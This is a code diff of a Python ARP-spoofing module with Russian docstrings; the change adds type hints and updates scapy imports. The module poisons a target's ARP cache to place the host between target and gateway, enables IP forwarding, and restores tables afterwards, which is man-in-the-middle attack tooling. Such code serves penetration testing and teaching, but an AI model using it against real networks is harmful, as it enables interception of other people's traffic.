@@ -2,15 +2,16 @@ from multiprocessing import Manager
 from threading import Thread
 import time
 from time import sleep
-from scapy.all import Ether, ARP, srp, send
+from scapy.layers.l2 import Ether, ARP
+from scapy.sendrecv import srp, send
 
 
 class ArpSpoofing:
     def __init__(
             self,
-            ip_target=str,
-            ip_gateway=str,
-            verbose=bool
+            ip_target: str,
+            ip_gateway: str,
+            verbose: bool
     ):
         """
         ip_target - IP адрес цели спуфинга, должен быть строкой
@@ -56,7 +57,7 @@ class ArpSpoofing:
         )
         self.linux_iproute(0)
 
-    def init_spoof(self, ip_target, ip_gateway, verbose):
+    def init_spoof(self, ip_target: str, ip_gateway: str, verbose: bool):
         """
         Инициализатор спуфинга. Запускает основную функцию в бесконечном режиме до вызова функции остановки
         """
@@ -71,7 +72,7 @@ class ArpSpoofing:
             self.stop_spoofing()
             raise ArpSpoofingError(Error, "Ошибка спуфинга цели")
 
-    def linux_iproute(self, data=int):
+    def linux_iproute(self, data: int):
         """
         Включение/Выключение функции IP Forward в ОС Linux
         1 - включена
@@ -88,7 +89,7 @@ class ArpSpoofing:
         else:
             raise ArpSpoofingError("Неверно указано значение", "Ошибка IP Forward")
 
-    def get_mac(self, ip):
+    def get_mac(self, ip: str):
         """
         Возвращает mac-адрес устройства по его IP
         """
@@ -96,7 +97,7 @@ class ArpSpoofing:
         if ans:
             return ans[0][1].src
 
-    def spoof(self, target_ip, host_ip, verbose):
+    def spoof(self, target_ip: str, host_ip: str, verbose: bool):
         """
         Спуффинг цели. Подмена кэша arp.
         """
@@ -107,7 +108,7 @@ class ArpSpoofing:
             self_mac = ARP().hwsrc
             print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))
 
-    def restore(self, target_ip, host_ip, verbose):
+    def restore(self, target_ip: str, host_ip: str, verbose: bool):
         """
         Восстановление связи между целью и шлюзом
         """
@@ -121,13 +122,13 @@ class ArpSpoofing:
 
 
 class ArpSpoofingError(Exception):
-    def __init__(self, Error, Message=str):
+    def __init__(self, Error, Message: str):
         self.name = Message
         self.text = Error
         super().__init__(self.name, self.text)
 
-# You write OOP-code? What is IT?
-def do_arp_spoofing(shared_memory, ip_target=str, ip_gateway=str, verbose=bool):
+
+def do_arp_spoofing(shared_memory, ip_target: str, ip_gateway: str, verbose: bool):
     arp_attack = ArpSpoofing(ip_target, ip_gateway, verbose)
     try:
         while True:
